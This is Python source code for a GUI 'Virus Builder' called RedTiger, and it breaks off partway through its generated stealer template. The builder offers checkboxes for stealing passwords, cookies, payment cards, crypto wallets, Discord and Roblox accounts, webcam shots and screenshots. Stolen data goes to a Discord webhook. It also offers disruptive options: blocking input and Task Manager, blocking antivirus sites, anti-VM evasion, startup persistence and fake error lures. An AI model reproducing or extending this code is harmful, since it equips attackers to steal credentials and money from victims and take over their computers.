import customtkinter as ctk
import tkinter
import os
import json
import shutil
import random
import string
import ast
import base64
import sys
import time
from tkinter import filedialog
from tkinter import messagebox
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# Constants
BEFORE = ""
AFTER = ""
ERROR = ""
INFO = ""
white = ""
red = ""
BEFORE_GREEN = ""
AFTER_GREEN = ""
version_tool = "1.0"
tool_path = "."
github_tool = "https://github.com/example"
name_tool = "RedTiger"
virus_banner = "Virus Builder"

def ErrorModule(e):
    print(f"Module import error: {e}")
    sys.exit(1)

def Title(title):
    print(f"\n=== {title} ===\n")

def Slow(text):
    print(text)

def current_time_hour():
    from datetime import datetime
    return datetime.now().strftime("%H:%M:%S")

def CheckWebhook(webhook):
    return webhook.startswith("https://discord.com/api/webhooks/")

def Continue():
    input("Press Enter to continue...")

def Reset():
    print("Reset function called")

# Main application
Title("Virus Builder")

try:
    exit_window = False

    colors = {
        "white": "#ffffff",
        "red": "#a80505",
        "dark_red": "#800000",
        "dark_gray": "#1e1e1e",
        "gray": "#444444",
        "light_gray": "#949494",
        "background": "#262626"
    }

    def ClosingWindow():
        global exit_window
        exit_window = True
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: 
                builder.after_cancel(after_id)
            except: 
                pass
        try: 
            builder.quit()
        except: 
            pass
        try: 
            builder.destroy()
        except: 
            pass

    def ClosingBuild():
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: 
                builder.after_cancel(after_id)
            except: 
                pass
        try: 
            builder.quit()
        except: 
            pass
        try: 
            builder.destroy()
        except: 
            pass

    builder = ctk.CTk()
    builder.title(f"RedTiger {version_tool} - Virus Builder")
    builder.geometry("800x720")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    
    # Load icon if available
    icon_path_full = os.path.join(tool_path, "Img", "RedTiger_icon.ico")
    if os.path.exists(icon_path_full):
        builder.iconbitmap(icon_path_full)

    # Initialize options
    option_system = "Disable"
    option_game_launchers = "Disable"
    option_wallets = "Disable"
    option_apps = "Disable"
    option_discord = "Disable"
    option_discord_injection = "Disable"
    option_passwords = "Disable"
    option_cookies = "Disable"
    option_history = "Disable"
    option_downloads = "Disable"
    option_cards = "Disable"
    option_extensions = "Disable"
    option_interesting_files = "Disable"
    option_roblox = "Disable"
    option_webcam = "Disable"
    option_screenshot = "Disable"

    option_block_key = "Disable"
    option_block_mouse = "Disable"
    option_block_task_manager = "Disable"
    option_block_website = "Disable"
    option_shutdown = "Disable"
    option_spam_open_programs = "Disable"
    option_spam_create_files = "Disable"
    option_fake_error = "Disable"
    option_startup = "Disable"
    option_restart = "Disable"
    option_anti_vm_and_debug = "Disable"
    webhook = "None"
    name_file = "None"
    icon_path = "None"
    file_type = "None"

    # String variables for checkboxes
    option_system_var = ctk.StringVar(value="Disable")
    option_game_launchers_var = ctk.StringVar(value="Disable")
    option_wallets_var = ctk.StringVar(value="Disable")
    option_apps_var = ctk.StringVar(value="Disable")
    option_roblox_var = ctk.StringVar(value="Disable")
    option_discord_var = ctk.StringVar(value="Disable")
    option_discord_injection_var = ctk.StringVar(value="Disable")
    option_passwords_var = ctk.StringVar(value="Disable")
    option_cookies_var = ctk.StringVar(value="Disable")
    option_history_var = ctk.StringVar(value="Disable")
    option_downloads_var = ctk.StringVar(value="Disable")
    option_cards_var = ctk.StringVar(value="Disable")
    option_extensions_var = ctk.StringVar(value="Disable")
    option_interesting_files_var = ctk.StringVar(value="Disable")
    option_webcam_var = ctk.StringVar(value="Disable")
    option_screenshot_var = ctk.StringVar(value="Disable")
    option_block_key_var = ctk.StringVar(value="Disable")
    option_block_mouse_var = ctk.StringVar(value="Disable")
    option_block_task_manager_var = ctk.StringVar(value="Disable")
    option_block_website_var = ctk.StringVar(value="Disable")
    option_shutdown_var = ctk.StringVar(value="Disable")
    option_spam_open_programs_var = ctk.StringVar(value="Disable")
    option_spam_create_files_var = ctk.StringVar(value="Disable")
    option_fake_error_var = ctk.StringVar(value="Disable")
    option_startup_var = ctk.StringVar(value="Disable")
    option_restart_var = ctk.StringVar(value="Disable")
    option_anti_vm_and_debug_var = ctk.StringVar(value="Disable")
    file_type_var = ctk.StringVar(value="File Type")
    webhook_var = ctk.StringVar(value="None")

    def ErrorLogs(message):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {message + white}")
        messagebox.showerror(f"RedTiger {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"RedTiger {version_tool} - Virus Builder", message)

    def TestWebhook():
        if CheckWebhook(webhook_url.get()):
            InfoLogs("The webhook is valid.")
        else:
            ErrorLogs("The webhook is invalid.")

    Slow(virus_banner)

    # Title Frame
    title_frame = ctk.CTkFrame(builder, width=780, height=198, fg_color=colors["background"]) 
    title_frame.grid(row=1, column=0, sticky="w", pady=(10, 0), padx=(10, 0))
    title_frame.grid_propagate(False)
    title_frame.grid_columnconfigure(0, weight=1)

    title = ctk.CTkLabel(title_frame, text="Virus Builder", 
                         font=ctk.CTkFont(family="Helvetica", size=40, weight="bold"), 
                         text_color=colors["red"])
    title.grid(row=1, pady=(10, 0), sticky="we", columnspan=3)

    text = ctk.CTkLabel(title_frame, 
                        text="The builder only creates viruses that work under Windows.", 
                        font=ctk.CTkFont(family="Helvetica", size=13), 
                        text_color=colors["red"])
    text.grid(row=2, pady=0, columnspan=3, sticky="we")

    url = ctk.CTkLabel(title_frame, text=github_tool, 
                       font=ctk.CTkFont(family="Helvetica", size=15), 
                       text_color=colors['white'])
    url.grid(row=3, pady=(3, 10), columnspan=3, sticky="we")

    webhook_url = ctk.CTkEntry(title_frame, height=45, width=350, corner_radius=5, 
                              font=ctk.CTkFont(family="Helvetica", size=15), 
                              justify="center", border_color=colors["red"], 
                              fg_color=colors["dark_gray"], border_width=2, 
                              placeholder_text="https://discord.com/api/webhooks/...", 
                              text_color=colors['white'])
    webhook_url.grid(row=4, column=0, padx=(150, 5), pady=10, sticky="we")

    test_webhook = ctk.CTkButton(title_frame, text="Test Webhook", command=TestWebhook, 
                                height=45, corner_radius=5, fg_color=colors["red"], 
                                hover_color=colors["dark_red"], 
                                font=ctk.CTkFont(family="Helvetica", size=14))
    test_webhook.grid(row=4, column=1, padx=(5, 150), pady=10, sticky="we")

    # Stealer Options Frame
    options_stealer_frame = ctk.CTkFrame(builder, width=720, height=209, fg_color=colors["dark_gray"]) 
    options_stealer_frame.grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_stealer_frame.grid_propagate(False)
    options_stealer_frame.grid_columnconfigure(0, weight=1)
    options_stealer_frame.grid_columnconfigure(1, weight=1)
    options_stealer_frame.grid_columnconfigure(2, weight=1)

    # Malware Options Frame
    options_malware_frame = ctk.CTkFrame(builder, width=720, height=150, fg_color=colors["dark_gray"]) 
    options_malware_frame.grid(row=3, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_malware_frame.grid_propagate(False)
    options_malware_frame.grid_columnconfigure(0, weight=1)
    options_malware_frame.grid_columnconfigure(1, weight=1)
    options_malware_frame.grid_columnconfigure(2, weight=1)

    def ChooseIcon():
        global icon_path
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                icon_path_full = os.path.join(tool_path, "Img", "RedTiger_icon.ico")
                if os.path.exists(icon_path_full):
                    root.iconbitmap(icon_path_full)
                root.withdraw()
                root.attributes('-topmost', True)
                icon_path = filedialog.askopenfilename(
                    parent=root, 
                    title=f"{name_tool} {version_tool} - Choose an icon (.ico)", 
                    filetypes=[("ICO files", "*.ico")])
                root.destroy()
            elif sys.platform.startswith("linux"):
                icon_path = filedialog.askopenfilename(
                    title=f"{name_tool} {version_tool} - Choose an icon (.ico)", 
                    filetypes=[("ICO files", "*.ico")])
        except Exception as e:
            ErrorLogs(f"Error choosing icon: {e}")

    fake_error_title = "Microsoft Excel"
    fake_error_message = "The file is corrupt and cannot be opened."
    fake_error_window_status = True

    def CreateFakeErrorWindow():
        global fake_error_window_status
        if fake_error_window_status:
            fake_error_window_status = False
        else:
            fake_error_window_status = True
            return

        fake_error_window = ctk.CTkToplevel(builder)
        fake_error_window.title(f"RedTiger {version_tool} - Fake Error")
        fake_error_window.geometry("300x250")
        fake_error_window.resizable(False, False)
        fake_error_window.configure(fg_color=colors["background"])

        fake_error_title_entry = ctk.CTkEntry(fake_error_window, justify="center", 
                                             placeholder_text="Error Title", 
                                             fg_color=colors["dark_gray"], 
                                             border_color=colors["red"], 
                                             font=ctk.CTkFont(family="Helvetica", size=13), 
                                             height=40, width=260)
        fake_error_title_entry.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")

        fake_error_message_entry = ctk.CTkEntry(fake_error_window, justify="center", 
                                               placeholder_text="Error Message", 
                                               fg_color=colors["dark_gray"], 
                                               border_color=colors["red"], 
                                               font=ctk.CTkFont(family="Helvetica", size=13), 
                                               height=40, width=260)
        fake_error_message_entry.grid(row=1, column=0, padx=20, pady=(10, 20), sticky="ew")

        def Validate():
            global fake_error_title, fake_error_message
            fake_error_title = fake_error_title_entry.get()
            fake_error_message = fake_error_message_entry.get()
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Title  : {white + fake_error_title}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Message: {white + fake_error_message}")
            fake_error_window.destroy()
            
        validate_button = ctk.CTkButton(fake_error_window, text="Validate", command=Validate, 
                                       fg_color=colors["red"], hover_color=colors["dark_red"], 
                                       font=ctk.CTkFont(family="Helvetica", size=14), 
                                       height=40, width=100)
        validate_button.grid(row=2, column=0, padx=20, pady=10, sticky="ew")

    # Create ALL checkboxes for stealer options
    option_system_cb = ctk.CTkCheckBox(options_stealer_frame, text="System Info", 
                                      variable=option_system_var, onvalue="Enable", offvalue="Disable", 
                                      fg_color=colors['red'], hover_color=colors['red'], 
                                      border_color=colors['red'], 
                                      font=ctk.CTkFont(family="Helvetica", size=15), 
                                      text_color=colors['white'])
    
    option_wallets_cb = ctk.CTkCheckBox(options_stealer_frame, text="Wallets Session Files", 
                                       variable=option_wallets_var, onvalue="Enable", offvalue="Disable", 
                                       fg_color=colors['red'], hover_color=colors['red'], 
                                       border_color=colors['red'], 
                                       font=ctk.CTkFont(family="Helvetica", size=15), 
                                       text_color=colors['white'])
    
    option_game_launchers_cb = ctk.CTkCheckBox(options_stealer_frame, text="Games Session Files", 
                                              variable=option_game_launchers_var, onvalue="Enable", offvalue="Disable", 
                                              fg_color=colors['red'], hover_color=colors['red'], 
                                              border_color=colors['red'], 
                                              font=ctk.CTkFont(family="Helvetica", size=15), 
                                              text_color=colors['white'])
    
    option_apps_cb = ctk.CTkCheckBox(options_stealer_frame, text="Telegram Session Files", 
                                    variable=option_apps_var, onvalue="Enable", offvalue="Disable", 
                                    fg_color=colors['red'], hover_color=colors['red'], 
                                    border_color=colors['red'], 
                                    font=ctk.CTkFont(family="Helvetica", size=15), 
                                    text_color=colors['white'])
    
    option_roblox_cb = ctk.CTkCheckBox(options_stealer_frame, text="Roblox Accounts", 
                                      variable=option_roblox_var, onvalue="Enable", offvalue="Disable", 
                                      fg_color=colors['red'], hover_color=colors['red'], 
                                      border_color=colors['red'], 
                                      font=ctk.CTkFont(family="Helvetica", size=15), 
                                      text_color=colors['white'])
    
    option_discord_cb = ctk.CTkCheckBox(options_stealer_frame, text="Discord Accounts", 
                                       variable=option_discord_var, onvalue="Enable", offvalue="Disable", 
                                       fg_color=colors['red'], hover_color=colors['red'], 
                                       border_color=colors['red'], 
                                       font=ctk.CTkFont(family="Helvetica", size=15), 
                                       text_color=colors['white'])
    
    option_discord_injection_cb = ctk.CTkCheckBox(options_stealer_frame, text="Discord Injection", 
                                                 variable=option_discord_injection_var, onvalue="Enable", offvalue="Disable", 
                                                 fg_color=colors['red'], hover_color=colors['red'], 
                                                 border_color=colors['red'], 
                                                 font=ctk.CTkFont(family="Helvetica", size=15), 
                                                 text_color=colors['white'])
    
    option_passwords_cb = ctk.CTkCheckBox(options_stealer_frame, text="Passwords", 
                                         variable=option_passwords_var, onvalue="Enable", offvalue="Disable", 
                                         fg_color=colors['red'], hover_color=colors['red'], 
                                         border_color=colors['red'], 
                                         font=ctk.CTkFont(family="Helvetica", size=15), 
                                         text_color=colors['white'])
    
    option_cookies_cb = ctk.CTkCheckBox(options_stealer_frame, text="Cookies", 
                                       variable=option_cookies_var, onvalue="Enable", offvalue="Disable", 
                                       fg_color=colors['red'], hover_color=colors['red'], 
                                       border_color=colors['red'], 
                                       font=ctk.CTkFont(family="Helvetica", size=15), 
                                       text_color=colors['white'])
    
    option_history_cb = ctk.CTkCheckBox(options_stealer_frame, text="Browsing History", 
                                       variable=option_history_var, onvalue="Enable", offvalue="Disable", 
                                       fg_color=colors['red'], hover_color=colors['red'], 
                                       border_color=colors['red'], 
                                       font=ctk.CTkFont(family="Helvetica", size=15), 
                                       text_color=colors['white'])
    
    option_downloads_cb = ctk.CTkCheckBox(options_stealer_frame, text="Download History", 
                                         variable=option_downloads_var, onvalue="Enable", offvalue="Disable", 
                                         fg_color=colors['red'], hover_color=colors['red'], 
                                         border_color=colors['red'], 
                                         font=ctk.CTkFont(family="Helvetica", size=15), 
                                         text_color=colors['white'])
    
    option_cards_cb = ctk.CTkCheckBox(options_stealer_frame, text="Cards", 
                                     variable=option_cards_var, onvalue="Enable", offvalue="Disable", 
                                     fg_color=colors['red'], hover_color=colors['red'], 
                                     border_color=colors['red'], 
                                     font=ctk.CTkFont(family="Helvetica", size=15), 
                                     text_color=colors['white'])
    
    option_extensions_cb = ctk.CTkCheckBox(options_stealer_frame, text="Extensions", 
                                          variable=option_extensions_var, onvalue="Enable", offvalue="Disable", 
                                          fg_color=colors['red'], hover_color=colors['red'], 
                                          border_color=colors['red'], 
                                          font=ctk.CTkFont(family="Helvetica", size=15), 
                                          text_color=colors['white'])
    
    option_interesting_files_cb = ctk.CTkCheckBox(options_stealer_frame, text="Interesting Files", 
                                                 variable=option_interesting_files_var, onvalue="Enable", offvalue="Disable", 
                                                 fg_color=colors['red'], hover_color=colors['red'], 
                                                 border_color=colors['red'], 
                                                 font=ctk.CTkFont(family="Helvetica", size=15), 
                                                 text_color=colors['white'])
    
    option_webcam_cb = ctk.CTkCheckBox(options_stealer_frame, text="Webcam", 
                                      variable=option_webcam_var, onvalue="Enable", offvalue="Disable", 
                                      fg_color=colors['red'], hover_color=colors['red'], 
                                      border_color=colors['red'], 
                                      font=ctk.CTkFont(family="Helvetica", size=15), 
                                      text_color=colors['white'])
    
    option_screenshot_cb = ctk.CTkCheckBox(options_stealer_frame, text="Screenshot", 
                                          variable=option_screenshot_var, onvalue="Enable", offvalue="Disable", 
                                          fg_color=colors['red'], hover_color=colors['red'], 
                                          border_color=colors['red'], 
                                          font=ctk.CTkFont(family="Helvetica", size=15), 
                                          text_color=colors['white'])

    # Create ALL checkboxes for malware options
    option_block_key_cb = ctk.CTkCheckBox(options_malware_frame, text="Block Key", 
                                         variable=option_block_key_var, onvalue="Enable", offvalue="Disable", 
                                         fg_color=colors['red'], hover_color=colors['red'], 
                                         border_color=colors['red'], 
                                         font=ctk.CTkFont(family="Helvetica", size=15), 
                                         text_color=colors['white'])
    
    option_block_mouse_cb = ctk.CTkCheckBox(options_malware_frame, text="Block Mouse", 
                                           variable=option_block_mouse_var, onvalue="Enable", offvalue="Disable", 
                                           fg_color=colors['red'], hover_color=colors['red'], 
                                           border_color=colors['red'], 
                                           font=ctk.CTkFont(family="Helvetica", size=15), 
                                           text_color=colors['white'])
    
    option_block_task_manager_cb = ctk.CTkCheckBox(options_malware_frame, text="Block Task Manager", 
                                                  variable=option_block_task_manager_var, onvalue="Enable", offvalue="Disable", 
                                                  fg_color=colors['red'], hover_color=colors['red'], 
                                                  border_color=colors['red'], 
                                                  font=ctk.CTkFont(family="Helvetica", size=15), 
                                                  text_color=colors['white'])
    
    option_block_website_cb = ctk.CTkCheckBox(options_malware_frame, text="Block AV Website", 
                                             variable=option_block_website_var, onvalue="Enable", offvalue="Disable", 
                                             fg_color=colors['red'], hover_color=colors['red'], 
                                             border_color=colors['red'], 
                                             font=ctk.CTkFont(family="Helvetica", size=15), 
                                             text_color=colors['white'])
    
    option_shutdown_cb = ctk.CTkCheckBox(options_malware_frame, text="Shutdown", 
                                        variable=option_shutdown_var, onvalue="Enable", offvalue="Disable", 
                                        fg_color=colors['red'], hover_color=colors['red'], 
                                        border_color=colors['red'], 
                                        font=ctk.CTkFont(family="Helvetica", size=15), 
                                        text_color=colors['white'])
    
    option_fake_error_cb = ctk.CTkCheckBox(options_malware_frame, text="Fake Error", 
                                          variable=option_fake_error_var, onvalue="Enable", offvalue="Disable", 
                                          fg_color=colors['red'], hover_color=colors['red'], 
                                          border_color=colors['red'], 
                                          font=ctk.CTkFont(family="Helvetica", size=15), 
                                          text_color=colors['white'], command=CreateFakeErrorWindow)
    
    option_spam_open_programs_cb = ctk.CTkCheckBox(options_malware_frame, text="Spam Open Program", 
                                                  variable=option_spam_open_programs_var, onvalue="Enable", offvalue="Disable", 
                                                  fg_color=colors['red'], hover_color=colors['red'], 
                                                  border_color=colors['red'], 
                                                  font=ctk.CTkFont(family="Helvetica", size=15), 
                                                  text_color=colors['white'])
    
    option_spam_create_files_cb = ctk.CTkCheckBox(options_malware_frame, text="Spam Create File", 
                                                 variable=option_spam_create_files_var, onvalue="Enable", offvalue="Disable", 
                                                 fg_color=colors['red'], hover_color=colors['red'], 
                                                 border_color=colors['red'], 
                                                 font=ctk.CTkFont(family="Helvetica", size=15), 
                                                 text_color=colors['white'])
    
    option_anti_vm_and_debug_cb = ctk.CTkCheckBox(options_malware_frame, text="Anti VM & Debug", 
                                                 variable=option_anti_vm_and_debug_var, onvalue="Enable", offvalue="Disable", 
                                                 fg_color=colors['red'], hover_color=colors['red'], 
                                                 border_color=colors['red'], 
                                                 font=ctk.CTkFont(family="Helvetica", size=15), 
                                                 text_color=colors['white'])
    
    option_startup_cb = ctk.CTkCheckBox(options_malware_frame, text="Launch at Startup", 
                                       variable=option_startup_var, onvalue="Enable", offvalue="Disable", 
                                       fg_color=colors['red'], hover_color=colors['red'], 
                                       border_color=colors['red'], 
                                       font=ctk.CTkFont(family="Helvetica", size=15), 
                                       text_color=colors['white'])
    
    option_restart_cb = ctk.CTkCheckBox(options_malware_frame, text="Restart Every 5min", 
                                       variable=option_restart_var, onvalue="Enable", offvalue="Disable", 
                                       fg_color=colors['red'], hover_color=colors['red'], 
                                       border_color=colors['red'], 
                                       font=ctk.CTkFont(family="Helvetica", size=15), 
                                       text_color=colors['white'])

    # Layout stealer options
    option_system_cb.grid(row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_wallets_cb.grid(row=2, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_game_launchers_cb.grid(row=3, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_apps_cb.grid(row=4, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_roblox_cb.grid(row=5, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_discord_cb.grid(row=6, column=0, padx=(60, 0), pady=3, sticky="nswe")

    option_discord_injection_cb.grid(row=1, column=1, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_passwords_cb.grid(row=2, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_cookies_cb.grid(row=3, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_history_cb.grid(row=4, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_downloads_cb.grid(row=5, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_cards_cb.grid(row=6, column=1, padx=(0, 0), pady=3, sticky="nswe")

    option_extensions_cb.grid(row=1, column=2, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_interesting_files_cb.grid(row=2, column=2, padx=(0, 0), pady=3, sticky="nswe")
    option_webcam_cb.grid(row=3, column=2, padx=(0, 0), pady=3, sticky="nswe")
    option_screenshot_cb.grid(row=4, column=2, padx=(0, 0), pady=3, sticky="nswe")

    # Layout malware options  
    option_block_key_cb.grid(row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_block_mouse_cb.grid(row=2, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_block_task_manager_cb.grid(row=3, column=0, padx=(60, 0), pady=3, sticky="nswe")
    option_block_website_cb.grid(row=4, column=0, padx=(60, 0), pady=3, sticky="nswe")

    option_spam_open_programs_cb.grid(row=1, column=1, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_spam_create_files_cb.grid(row=2, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_shutdown_cb.grid(row=3, column=1, padx=(0, 0), pady=3, sticky="nswe")
    option_fake_error_cb.grid(row=4, column=1, padx=(0, 0), pady=3, sticky="nswe")

    option_anti_vm_and_debug_cb.grid(row=1, column=2, padx=(0, 0), pady=(18,3), sticky="nswe")
    option_startup_cb.grid(row=2, column=2, padx=(0, 0), pady=3, sticky="nswe")
    option_restart_cb.grid(row=3, column=2, padx=(0, 0), pady=3, sticky="nswe")

    # Build Frame
    build_frame = ctk.CTkFrame(builder, width=720, height=40, fg_color=colors["background"]) 
    build_frame.grid(row=4, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    build_frame.grid_propagate(False)
    build_frame.grid_columnconfigure(0, weight=1)
    build_frame.grid_columnconfigure(1, weight=1)
    build_frame.grid_columnconfigure(2, weight=1)

    name_file_entry = ctk.CTkEntry(build_frame, height=30, width=140, corner_radius=5, 
                                  font=ctk.CTkFont(family="Helvetica", size=12), 
                                  justify="center", border_color=colors["red"], 
                                  text_color=colors['white'], fg_color=colors["dark_gray"], 
                                  border_width=2, placeholder_text="File Name")
    name_file_entry.grid(row=1, column=0, padx=0, sticky="w", pady=0)

    def FileTypeChanged(*args):
        if file_type_var.get() in ["Python File", "File Type"]:
            icon_button.configure(state="disabled")
        else:
            icon_button.configure(state="normal")

    file_type_menu = ctk.CTkOptionMenu(build_frame, height=30, width=140, 
                                      font=ctk.CTkFont(family="Helvetica", size=12), 
                                      variable=file_type_var, values=["Python File", "Exe File"], 
                                      fg_color=colors['dark_gray'], button_color=colors["red"], 
                                      button_hover_color=colors['dark_red'])
    file_type_menu.grid(row=1, column=2, sticky="w", padx=0, pady=0)

    icon_button = ctk.CTkButton(build_frame, height=30, width=140, text="Select Icon", 
                               command=ChooseIcon, fg_color=colors["red"], 
                               hover_color=colors["dark_red"], 
                               text_color_disabled=colors["light_gray"])
    icon_button.grid(row=1, column=2, sticky="e", padx=0, pady=0)
    icon_button.configure(state="disabled")
    file_type_var.trace_add("write", FileTypeChanged)

    def CreateRealStealer():
        """Crée un vrai stealer comme Captain Hook"""
        try:
            # Template de stealer complet
            stealer_code = f'''
import os
import sys
import json
import requests
import platform
import socket
import getpass
import shutil
from datetime import datetime
import subprocess
import win32crypt
import sqlite3
import base64
import re
import browser_cookie3

# Configuration
WEBHOOK_URL = "{webhook}"
FAKE_ERROR_TITLE = "{fake_error_title}"
FAKE_ERROR_MESSAGE = "{fake_error_message}"

# Options
OPTIONS = {{
    "system": "{option_system}",
    "wallets": "{option_wallets}",
    "game_launchers": "{option_game_launchers}",
    "apps": "{option_apps}",
    "discord": "{option_discord}",
    "discord_injection": "{option_discord_injection}",
    "passwords": "{option_passwords}",
    "cookies": "{option_cookies}",
    "history": "{option_history}",
    "downloads": "{option_downloads}",
    "cards": "{option_cards}",
    "extensions": "{option_extensions}",
    "interesting_files": "{option_interesting_files}",
    "roblox": "{option_roblox}",
    "webcam": "{option_webcam}",
    "screenshot": "{option_screenshot}",
    "block_key": "{option_block_key}",
    "block_mouse": "{option_block_mouse}",
    "block_task_manager": "{option_block_task_manager}",
    "block_website": "{option_block_website}",
    "shutdown": "{option_shutdown}",
    "spam_open_programs": "{option_spam_open_programs}",
    "spam_create_files": "{option_spam_create_files}",
    "fake_error": "{option_fake_error}",
    "startup": "{option_startup}",
    "restart": "{option_restart}",
    "anti_vm_and_debug": "{option_anti_vm_and_debug}"
}}

class CaptainHookStealer:
    def __init__(self):
        self.collected_data = {{}}
        self.webhook_url = WEBHOOK_URL
        
    def get_system_info(self):
        """Récupère les informations système"""
        try:
            system_info = {{
                "Computer Name": socket.gethostname(),
                "Username": getpass.getuser(),
                "OS": platform.system() + " " + platform.version(),
                "Processor": platform.processor(),
                "Architecture": platform.architecture()[0],
                "IP Address": socket.gethostbyname(socket.gethostname())
            }}
            return system_info
        except Exception as e:
            return {{"Error": str(e)}}
    
    def get_browser_passwords(self):
        """Récupère les mots de passe des navigateurs"""
        passwords =